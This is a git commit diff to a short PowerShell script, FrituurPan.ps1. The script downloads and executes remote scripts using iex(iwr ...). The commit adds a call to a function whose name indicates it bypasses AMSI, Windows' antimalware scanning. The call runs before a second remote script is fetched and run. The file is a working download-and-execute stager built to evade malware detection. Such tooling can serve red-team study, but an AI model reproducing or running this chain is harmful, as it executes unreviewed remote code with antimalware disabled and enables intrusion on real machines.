1add11e4edd5dbc3c4ee72eb8ab5dd04f7a623c8
Justin Perdok <justin-p@users.noreply.github.com>
2020-08-26 12:58:19 +0000

    Update FrituurPan.ps1

--- FrituurPan.ps1
+++ FrituurPan.ps1
@@ -1,2 +1,3 @@
 iex((iwr https://raw.githubusercontent.com/justin-p/PowerShell/master/AMibypaSsedI.ps1).content)
+AMibypaSsedI
 iex((iwr https://raw.githubusercontent.com/justin-p/PowerShell/master/KnotsDuKip.ps1).content)
